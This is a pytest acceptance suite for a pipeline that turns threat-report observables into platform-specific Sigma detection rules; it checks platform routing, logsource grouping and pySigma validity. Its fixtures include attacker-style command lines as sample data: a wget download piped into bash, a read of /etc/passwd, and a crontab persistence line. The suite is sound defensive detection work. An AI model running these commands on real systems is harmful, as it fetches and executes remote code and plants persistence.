"""Phase-one Platform Telemetry Expansion -- product-contract acceptance suite.

This module is the canonical proof artifact for goal-mode acceptance (spec
``docs/superpowers/specs/2026-06-17-platform-telemetry-expansion-design.md``
sections 0.3 and 9.1). It holds one test per Section-9 acceptance bullet. Each
test drives a platform fixture through the *real* routing/grouping/enrichment
helpers and -- for the rule-generation bullets -- through the real
``generate_sigma`` node, then validates every emitted rule with the real pySigma
validator (``validate_sigma_rule``). The LLM extraction/generation calls are the
only stubbed seam: they are external and non-deterministic, so each fixture seeds
the ``extraction_result`` those steps would have produced and the SIGMA service is
mocked to return platform-appropriate rule YAML the routing layer then stamps.

Marked ``smoke`` so the literal §0.3 command selects it:

    .venv/bin/python run_tests.py --paths tests/workflows/test_platform_telemetry_phase_one.py --output-format quiet

Conditional fixtures (network observable, HuntQuery) are included per the
operator decision recorded for this run: both NetworkIndicatorExtract and
HuntQueriesExtract are pulled in as Sigma-generating (spec §9.1 / §0.5).
"""

import re
from unittest.mock import AsyncMock, Mock, patch

import pytest
import yaml

from src.database.models import (
    AgenticWorkflowConfigTable,
    AgenticWorkflowExecutionTable,
    ArticleTable,
)
from src.services.sigma_generation_service import SIGMA_GROUNDING_METADATA_FIELDS
from src.services.sigma_validator import validate_sigma_rule
from src.workflows.agentic_workflow import (
    AGENT_PLATFORM_CAPABILITIES,
    SUPPORTED_PLATFORM_VALUES,
    _agent_supported_for_platforms,
    _build_sigma_generation_groups,
    _enrich_observable_metadata,
    _make_skip_record,
    _observable_sigma_eligible,
    create_agentic_workflow,
)
from src.workflows.status_utils import TERMINATION_REASON_NO_SIGMA_RULES

pytestmark = [pytest.mark.smoke, pytest.mark.unit]


# ---------------------------------------------------------------------------
# Contract constants
# ---------------------------------------------------------------------------

# The controlled platform vocabulary every observable must draw from (spec §2/§5).
CONTROLLED_PLATFORMS = {"windows", "linux", "macos", "cross_platform", "unknown"}

# Extractors that are Windows-only in phase one (spec §4) and must be skipped on
# non-Windows evidence with a structured record.
WINDOWS_ONLY_EXTRACTORS = {"RegistryExtract", "ServicesExtract", "ScheduledTasksExtract"}

# Windows/Sysmon-specific process_creation event fields that must NOT appear in a
# Linux process_creation rule's detection (spec §9 final bullet). CommandLine /
# Image / ParentImage are shared across Windows and Linux Sigma process_creation
# and are intentionally absent here.
WINDOWS_ONLY_PROCESS_FIELDS = {
    "OriginalFileName",
    "IntegrityLevel",
    "Imphash",
    "imphash",
    "Hashes",
    "Company",
    "Product",
    "ParentProcessGuid",
    "ProcessGuid",
    "LogonGuid",
}


# ---------------------------------------------------------------------------
# Fixture builders -- seed the extraction_result each platform article produces.
#
# Observables are run through the REAL _enrich_observable_metadata so the
# platform/telemetry/logsource routing fields are computed exactly as production
# computes them. ``items`` entries are the raw extractor outputs: a plain string
# (generic command -> platform inferred from the article) or a dict carrying an
# explicit platform/telemetry/logsource (observable-level metadata wins, §5).
# ---------------------------------------------------------------------------


def _enriched_extraction(items, article_platforms):
    """Build an extraction_result with real per-observable routing metadata."""
    observables = []
    content_lines = []
    for observable_type, item in items:
        value = item["value"] if isinstance(item, dict) else item
        obs = {"type": observable_type, "value": value}
        _enrich_observable_metadata(
            obs,
            item=item,
            observable_type=observable_type,
            article_platforms=article_platforms,
        )
        observables.append(obs)
        content_lines.append(str(value))
    return {
        "observables": observables,
        "summary": {"count": len(observables), "platforms_detected": article_platforms},
        "discrete_huntables_count": len(observables),
        "content": "\n".join(content_lines),
    }


def _linux_only_extraction():
    return _enriched_extraction(
        [("cmdline", "/usr/bin/wget http://203.0.113.10/x.sh -O /tmp/x.sh && /bin/bash /tmp/x.sh")],
        article_platforms=["linux"],
    )


def _mixed_extraction():
    # Observable-level platform metadata is explicit so each side routes to its
    # own logsource group (a generic mixed-article command would stay unknown).
    return _enriched_extraction(
        [
            ("cmdline", {"platform": "windows", "value": "cmd.exe /c whoami /all"}),
            ("cmdline", {"platform": "linux", "value": "/bin/bash -c 'id; cat /etc/passwd'"}),
        ],
        article_platforms=["windows", "linux"],
    )


def _macos_only_extraction():
    return _enriched_extraction(
        [("cmdline", "osascript -e 'do shell script \"whoami\"'")],
        article_platforms=["macos"],
    )


def _ambiguous_extraction():
    # Generic interpreter command in a mixed-evidence article: must stay unknown
    # and therefore display-only (no logsource, not Sigma-eligible).
    return _enriched_extraction(
        [("cmdline", "python -m http.server 8080")],
        article_platforms=["windows", "linux"],
    )


def _network_extraction():
    # Genuinely OS-neutral network indicator -> cross_platform, network_connection
    # telemetry always carries a logsource, so it is standalone Sigma-eligible.
    return _enriched_extraction(
        [
            (
                "network_indicators",
                {"platform": "cross_platform", "value": "203.0.113.55", "telemetry_category": "network_connection"},
            )
        ],
        article_platforms=["linux"],
    )


def _huntquery_extraction():
    # HuntQuery with a CLEAR backend and target telemetry (explicit logsource_hint
    # + telemetry_category) -> Sigma-eligible per §2 conditional scope.
    return _enriched_extraction(
        [
            (
                "hunt_queries",
                {
                    "platform": "linux",
                    "value": "process where process.name == 'id' and process.parent.name == 'sh'",
                    "telemetry_category": "process_creation",
                    "logsource_hint": {"product": "linux", "category": "process_creation"},
                },
            )
        ],
        article_platforms=["linux"],
    )


def _huntquery_without_target_extraction():
    # HuntQuery WITHOUT a clear backend/target -> stays display-only.
    return _enriched_extraction(
        [("hunt_queries", {"platform": "linux", "value": "search for suspicious logins"})],
        article_platforms=["linux"],
    )


def _linux_persistence_deferred_extraction():
    # Persistence artifacts are out of scope in phase one (§2). A persistence
    # observable carries no supported logsource, so it is display-only and the
    # execution completes without emitting a (deferred) persistence rule.
    return _enriched_extraction(
        [
            (
                "cmdline",
                {
                    "platform": "linux",
                    "value": "echo '* * * * * /tmp/x.sh' | crontab -",
                    "telemetry_category": "persistence",
                },
            )
        ],
        article_platforms=["linux"],
    )


def _all_sigma_generating_fixtures():
    return {
        "linux_only": _linux_only_extraction(),
        "mixed": _mixed_extraction(),
        "network": _network_extraction(),
        "huntquery": _huntquery_extraction(),
    }


# ---------------------------------------------------------------------------
# generate_sigma node harness (mirrors tests/workflows/test_agentic_workflow_steps.py)
# ---------------------------------------------------------------------------


@pytest.fixture
def article():
    art = Mock(spec=ArticleTable)
    art.id = 1
    art.title = "Platform Telemetry Acceptance Fixture"
    art.content = "Fixture article content used for SIGMA generation. " + "x" * 600
    art.canonical_url = "https://example.com/acceptance"
    art.article_metadata = {"threat_hunting_score": 85, "ml_hunt_score": 80}
    source_mock = Mock()
    source_mock.name = "Acceptance Source"
    art.source = source_mock
    return art


@pytest.fixture
def execution():
    ex = Mock(spec=AgenticWorkflowExecutionTable)
    ex.id = 4242
    ex.article_id = 1
    ex.status = "running"
    ex.current_step = None
    ex.error_log = None
    ex.error_message = None
    ex.config_snapshot = {}
    ex.extraction_result = None
    ex.ranking_score = None
    ex.ranking_reasoning = None
    ex.sigma_rules = None
    ex.similarity_results = None
    ex.started_at = None
    ex.junk_filter_result = None
    return ex


@pytest.fixture
def config_obj():
    cfg = Mock(spec=AgenticWorkflowConfigTable)
    cfg.id = 1
    cfg.version = 1
    cfg.agent_models = {"SigmaAgent": "gpt-4", "SigmaAgent_provider": "openai"}
    cfg.agent_prompts = {}
    cfg.sigma_fallback_enabled = True
    return cfg


def _make_db_session(article, execution):
    session = Mock()
    session.commit = Mock()
    session.refresh = Mock()
    session.add = Mock()

    def query_side_effect(model):
        q = Mock()
        if model == ArticleTable:
            q.filter.return_value.first.return_value = article
        elif model == AgenticWorkflowExecutionTable:
            chain = q.filter.return_value
            chain.first.return_value = execution
            chain.order_by.return_value.first.return_value = execution
        else:
            q.filter.return_value.first.return_value = None
            q.filter.return_value.order_by.return_value.first.return_value = None
        return q

    session.query.side_effect = query_side_effect
    return session


def _default_state(**overrides):
    base = {
        "article_id": 1,
        "execution_id": 4242,
        "article": None,
        "config": {},
        "filtered_content": None,
        "junk_filter_result": None,
        "ranking_score": None,
        "ranking_reasoning": None,
        "should_continue": True,
        "os_detection_result": None,
        "detected_os": None,
        "platforms_detected": None,
        "extraction_result": None,
        "discrete_huntables_count": None,
        "sigma_rules": None,
        "similarity_results": None,
        "max_similarity": None,
        "queued_rules": None,
        "error": None,
        "current_step": "init",
        "status": "running",
        "termination_reason": None,
        "termination_details": None,
    }
    base.update(overrides)
    return base


def _capture_nodes(db_session, config_obj):
    captured: dict = {}
    with (
        patch("src.workflows.agentic_workflow.ContentFilter"),
        patch("src.workflows.agentic_workflow.WorkflowTriggerService") as mock_ts,
        patch("src.workflows.agentic_workflow.StateGraph") as mock_sg,
    ):
        mock_ts.return_value.get_active_config.return_value = config_obj
        fake_graph = Mock()
        fake_graph.add_node = lambda name, fn: captured.update({name: fn})
        fake_graph.add_edge = Mock()
        fake_graph.add_conditional_edges = Mock()
        fake_graph.set_entry_point = Mock()
        fake_graph.compile = Mock(return_value=Mock())
        mock_sg.return_value = fake_graph
        create_agentic_workflow(db_session)
    return captured


def _make_generate_side_effect():
    """Return a SIGMA service stub that emits one platform-appropriate rule per group."""
    counter = {"n": 0}

    async def side_effect(*args, **kwargs):
        extraction_result = kwargs["extraction_result"]
        group = extraction_result["sigma_generation_group"]
        platform = group["platform"]
        telemetry = group["telemetry_category"]
        logsource_hint = group.get("logsource_hint") or {}
        # Observable-driven groups carry observables; the legacy full-content fallback
        # group has none, so fall back to the synthesized content block.
        observables = extraction_result.get("observables") or []
        if observables:
            value = str(observables[0].get("value"))
        else:
            content = (extraction_result.get("content") or "fallback content").splitlines()
            value = content[0] if content else "fallback content"

        logsource = {}
        if isinstance(logsource_hint, dict):
            logsource = {k: v for k, v in logsource_hint.items() if k in ("product", "category")}
        if not logsource:
            logsource = {"category": telemetry}

        if telemetry == "network_connection":
            selection = {"DestinationIp": value[:64]}
        else:
            selection = {"CommandLine|contains": value[:120]}

        counter["n"] += 1
        rule = {
            "title": f"{platform} {telemetry} activity",
            "id": f"aaaaaaaa-0000-0000-0000-{counter['n']:012d}",
            "status": "experimental",
            "description": "Generated for platform-telemetry acceptance fixture",
            "logsource": logsource,
            "detection": {"selection": selection, "condition": "selection"},
            "observables_used": [0],
        }
        return {
            "rules": [rule],
            "metadata": {
                "total_attempts": 1,
                "valid_rules": 1,
                "validation_results": [{"is_valid": True, "errors": [], "warnings": [], "rule_index": 1}],
                "conversation_log": [{"event_type": "generation_call", "generated_rule_count": 1}],
            },
            "errors": None,
        }

    return side_effect


async def _run_generate_sigma(article, execution, config_obj, extraction_result):
    """Drive the real generate_sigma node for an extraction fixture; return its state."""
    db_session = _make_db_session(article, execution)
    nodes = _capture_nodes(db_session, config_obj)
    with patch("src.services.sigma_generation_service.SigmaGenerationService") as mock_sigma_cls:
        mock_sigma = Mock()
        mock_sigma.generate_sigma_rules = AsyncMock(side_effect=_make_generate_side_effect())
        mock_sigma_cls.return_value = mock_sigma
        result = await nodes["generate_sigma"](
            _default_state(
                filtered_content=article.content,
                extraction_result=extraction_result,
                discrete_huntables_count=extraction_result.get("discrete_huntables_count"),
            )
        )
    return result


# ---------------------------------------------------------------------------
# Rule -> pySigma validation helper (mirrors the production strip path)
# ---------------------------------------------------------------------------


def _validate_emitted_rule(rule):
    """Strip non-Sigma grounding metadata (as production does) and validate via pySigma."""
    rule_for_yaml = {k: v for k, v in rule.items() if k not in SIGMA_GROUNDING_METADATA_FIELDS}
    rule_yaml = yaml.dump(rule_for_yaml, default_flow_style=False, sort_keys=False)
    return rule_yaml, validate_sigma_rule(rule_yaml)


def _detection_field_names(rule):
    """Return the set of detection-selection field names (modifiers stripped)."""
    detection = rule.get("detection", {})
    fields = set()
    for key, block in detection.items():
        if key == "condition":
            continue
        if isinstance(block, dict):
            for field in block:
                fields.add(re.split(r"\|", field)[0])
    return fields


# ===========================================================================
# §9 acceptance bullets -- one test per bullet
# ===========================================================================


def test_platform_vocabulary_is_the_controlled_set():
    """Spec §2/§5: the observable platform vocabulary is exactly the controlled set."""
    assert SUPPORTED_PLATFORM_VALUES == CONTROLLED_PLATFORMS


def test_linux_only_skips_windows_only_extractors_with_structured_reasons():
    """§9: Linux-only executions skip the Windows-only extractors with structured records."""
    detected = ["linux"]
    for extractor in WINDOWS_ONLY_EXTRACTORS:
        assert _agent_supported_for_platforms(extractor, detected) is False
        record = _make_skip_record(
            agent_name=extractor,
            reason_code="unsupported_platform",
            reason=f"{extractor} supports windows only; detected platforms: linux.",
            detected_platforms=detected,
            telemetry_categories=["registry"],
        )
        assert record["extractor"] == extractor
        assert record["status"] == "skipped"
        assert record["reason_code"] == "unsupported_platform"
        assert record["reason"]
        assert record["supported_platforms"] == ["windows"]
        assert record["detected_platforms"] == ["linux"]
    # CmdlineExtract / ProcTreeExtract are platform-aware and keep running on Linux.
    assert _agent_supported_for_platforms("CmdlineExtract", detected) is True
    assert _agent_supported_for_platforms("ProcTreeExtract", detected) is True


def test_every_observable_carries_a_non_null_controlled_platform():
    """§0.2: every observable carries a non-null platform in the controlled set."""
    fixtures = [
        _linux_only_extraction(),
        _mixed_extraction(),
        _macos_only_extraction(),
        _ambiguous_extraction(),
        _network_extraction(),
        _huntquery_extraction(),
        _linux_persistence_deferred_extraction(),
    ]
    for extraction in fixtures:
        for obs in extraction["observables"]:
            assert obs.get("platform") is not None
            assert obs["platform"] in CONTROLLED_PLATFORMS


@pytest.mark.asyncio
async def test_linux_process_evidence_generates_backend_neutral_sigma_with_metadata(article, execution, config_obj):
    """§9: Linux command/process evidence generates backend-neutral Sigma carrying
    explicit logsource + platform + generation_basis metadata."""
    result = await _run_generate_sigma(article, execution, config_obj, _linux_only_extraction())
    rules = result["sigma_rules"]
    assert len(rules) == 1
    rule = rules[0]
    assert rule["platform"] == "linux"
    assert rule["telemetry_category"] == "process_creation"
    assert rule["generation_basis"] == "process_creation_generic"
    assert rule["detection_readiness"] == "generic"
    # Explicit logsource on the emitted YAML.
    _, validation = _validate_emitted_rule(rule)
    assert validation.is_valid, validation.errors
    assert rule["logsource"].get("category") == "process_creation"
    assert rule["logsource"].get("product") == "linux"


@pytest.mark.asyncio
async def test_mixed_article_generates_per_platform_logsource_groups(article, execution, config_obj):
    """§9: Mixed Windows/Linux executions generate separate per-platform/logsource rule groups."""
    result = await _run_generate_sigma(article, execution, config_obj, _mixed_extraction())
    rules = result["sigma_rules"]
    assert len(rules) == 2
    assert [r["platform"] for r in rules] == ["windows", "linux"]
    # Each rule grounded in exactly its own observable (execution-wide indices).
    assert [r["observables_used"] for r in rules] == [[0], [1]]
    for rule in rules:
        _, validation = _validate_emitted_rule(rule)
        assert validation.is_valid, validation.errors


@pytest.mark.asyncio
async def test_macos_only_generates_no_sigma(article, execution, config_obj):
    """§9: macOS-only executions generate NO macOS Sigma but still complete cleanly."""
    assert _build_sigma_generation_groups(_macos_only_extraction()) == []
    result = await _run_generate_sigma(article, execution, config_obj, _macos_only_extraction())
    assert result["sigma_rules"] == []
    assert result["termination_reason"] == TERMINATION_REASON_NO_SIGMA_RULES
    assert result["current_step"] == "generate_sigma"


@pytest.mark.asyncio
async def test_every_generated_rule_has_observable_logsource_selection_and_valid_yaml(article, execution, config_obj):
    """§9 + §0.3 'no crashes / valid generated Sigma YAML': every emitted rule across all
    Sigma-generating fixtures contains >=1 observable, an explicit logsource, a non-empty
    detection selection, and passes pySigma validation."""
    for name, extraction in _all_sigma_generating_fixtures().items():
        result = await _run_generate_sigma(article, execution, config_obj, extraction)
        rules = result["sigma_rules"]
        assert rules, f"fixture {name} produced no rules"
        for rule in rules:
            assert rule.get("observables_used"), f"{name}: rule has no grounding observable"
            logsource = rule.get("logsource") or {}
            assert logsource.get("product") or logsource.get("category"), f"{name}: rule missing explicit logsource"
            selection = rule.get("detection", {}).get("selection")
            assert selection, f"{name}: rule has empty detection selection"
            rule_yaml, validation = _validate_emitted_rule(rule)
            assert validation.is_valid, f"{name}: invalid Sigma YAML: {validation.errors}\n{rule_yaml}"


@pytest.mark.asyncio
async def test_linux_process_rule_uses_no_windows_only_fields(article, execution, config_obj):
    """§9 final bullet: Linux process_creation rules use no Windows-only fields."""
    result = await _run_generate_sigma(article, execution, config_obj, _linux_only_extraction())
    rule = result["sigma_rules"][0]
    assert rule["platform"] == "linux"
    assert rule["telemetry_category"] == "process_creation"
    leaked = _detection_field_names(rule) & WINDOWS_ONLY_PROCESS_FIELDS
    assert not leaked, f"Linux process_creation rule leaked Windows-only fields: {leaked}"


@pytest.mark.asyncio
async def test_network_observable_generates_backend_neutral_sigma(article, execution, config_obj):
    """§2/§9 conditional (operator-approved): a ready network observable generates Sigma."""
    extraction = _network_extraction()
    assert _observable_sigma_eligible(extraction["observables"][0]) is True
    result = await _run_generate_sigma(article, execution, config_obj, extraction)
    rules = result["sigma_rules"]
    assert len(rules) == 1
    rule = rules[0]
    assert rule["telemetry_category"] == "network_connection"
    assert (rule.get("logsource") or {}).get("category") == "network_connection"
    _, validation = _validate_emitted_rule(rule)
    assert validation.is_valid, validation.errors


@pytest.mark.asyncio
async def test_huntquery_generates_sigma_only_with_clear_backend_and_target(article, execution, config_obj):
    """§2/§9 conditional (operator-approved): HuntQuery is Sigma-eligible only when backend +
    target telemetry are clear; a vague HuntQuery routes no platform group (display-only)."""
    # Clear backend + target (explicit logsource_hint + telemetry_category) -> eligible group.
    clear = _huntquery_extraction()
    assert _observable_sigma_eligible(clear["observables"][0]) is True
    result = await _run_generate_sigma(article, execution, config_obj, clear)
    assert len(result["sigma_rules"]) == 1
    rule = result["sigma_rules"][0]
    assert rule["telemetry_category"] == "process_creation"
    _, validation = _validate_emitted_rule(rule)
    assert validation.is_valid, validation.errors

    # No clear backend/target -> not Sigma-eligible, no platform-routed group.
    vague = _huntquery_without_target_extraction()
    assert _observable_sigma_eligible(vague["observables"][0]) is False
    assert _build_sigma_generation_groups(vague) == []


@pytest.mark.asyncio
async def test_linux_persistence_artifacts_are_deferred_without_crash(article, execution, config_obj):
    """§2/§3: Linux persistence artifacts route no platform-specific (persistence) Sigma group
    -- they are deferred -- and the execution completes without crashing. The legacy
    full-content fallback may still emit a generic linux rule, but never a persistence rule."""
    extraction = _linux_persistence_deferred_extraction()
    assert _build_sigma_generation_groups(extraction) == []
    assert _observable_sigma_eligible(extraction["observables"][0]) is False
    result = await _run_generate_sigma(article, execution, config_obj, extraction)
    assert result["current_step"] == "generate_sigma"


def test_ambiguous_command_evidence_is_display_only():
    """§5: ambiguous command evidence stays unknown/display-only (not Sigma-eligible)."""
    extraction = _ambiguous_extraction()
    obs = extraction["observables"][0]
    assert obs["platform"] == "unknown"
    assert _observable_sigma_eligible(obs) is False
    assert _build_sigma_generation_groups(extraction) == []


def test_extractor_capability_matrix_matches_phase_one_intent():
    """§4: Windows-only extractors expose only windows; shared extractors are platform-aware."""
    for extractor in WINDOWS_ONLY_EXTRACTORS:
        assert AGENT_PLATFORM_CAPABILITIES[extractor] == {"windows"}
    for extractor in ("CmdlineExtract", "ProcTreeExtract", "NetworkIndicatorExtract", "HuntQueriesExtract"):
        assert {"windows", "linux"}.issubset(AGENT_PLATFORM_CAPABILITIES[extractor])
